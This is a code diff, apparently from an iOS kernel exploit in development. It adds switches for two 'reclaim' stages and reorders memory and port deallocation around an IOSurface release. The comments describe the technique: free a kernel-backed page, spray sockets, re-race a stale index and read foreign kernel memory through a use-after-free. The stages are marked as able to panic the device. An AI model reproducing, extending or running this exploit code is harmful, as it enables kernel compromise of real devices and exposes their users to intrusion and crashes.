@@ -914,11 +914,20 @@ static CFNumberRef RCNUM(int64_t v) {
                hw, hf, hp);
     }
 
+        /* knob triage (calib): knob "v12" runs the whole-surface stage only;
+           knob "v12.2" runs the mlock stage only; unset/other runs both */
+        char knv[32];
+        BOOL g_runWhole = YES, g_runMlock = YES;
+        if (LabKnobRead("cscali", knv, (int)sizeof knv) == 1) {
+            if (strncmp(knv, "v12.2", 5) == 0) g_runWhole = NO;
+            else if (strncmp(knv, "v12", 3) == 0) g_runMlock = NO;
+            else if (strncmp(knv, "untagged", 8) == 0) { /* spray-mode knob, run both */ }
+        }
     /* ---- v12 RECLAIM: free our page, let the kernel reuse it, re-race
        the same stale index. FOREIGN content in the window = real kread.
        PANIC-POSSIBLE (UAF-class by construction); solo tap, one per
        force-quit; nothing in the existing race bodies is altered. */
-    {
+    if (g_runWhole) {
         IOSurfaceRef reSurf = pCreate((__bridge CFDictionaryRef)@{
             @"IOSurfaceAllocSize": @(0x8000),
             @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
@@ -953,9 +962,10 @@ static CFNumberRef RCNUM(int64_t v) {
                 /* RELEASE: the kernel backing of reSurf returns its pages
                    to the free pool (CFRelease drops the last ref; the
                    fingerprint pages are now reclaimable kernel memory) */
-                CFRelease(reSurf);
-                (void)rfillArr;
-                rc_log("[v12] surface released; spray pressure still on (sockets so far: %llu)",
+                                (void)mach_vm_deallocate(mach_task_self(), reMap, 0x8000);
+                (void)mach_port_deallocate(mach_task_self(), reObj);
+                CFRelease(reSurf); (void)rfillArr;
+                rc_log("[v12] surface released + alias torn down; spray pressure still on (sockets so far: %llu)",
                        rc_sprayAllocs);
                 /* re-race the union of this boot's hot offsets via the
                    replay iter choreography — content that is neither our
@@ -1030,8 +1040,6 @@ static CFNumberRef RCNUM(int64_t v) {
                 } else {
                     LabBanditNote("cscali", "v12 reclaim: no foreign reuse captured");
                 }
-                (void)mach_vm_deallocate(mach_task_self(), reMap, 0x8000);
-                (void)mach_port_deallocate(mach_task_self(), reObj);
             }
         }
     }
@@ -1045,7 +1053,7 @@ static CFNumberRef RCNUM(int64_t v) {
        kernel refuses client-supplied IOSurfaceAddress on this device, the
        stage logs that honestly and continues (v12's whole-surface path
        already ran above). PANIC-POSSIBLE; solo; one per force-quit. */
-    {
+    if (g_runMlock) {
         rc_log("--- v12.2 RECLAIM: bind->mlock->munlock(one window)->re-race (PANIC-POSSIBLE) ---");
         uint64_t cand22[8]; uint32_t candN = 0;
         for (uint32_t i = 0; i < rc_hotN && candN < 4; i++) cand22[candN++] = rc_hotOffs[i];
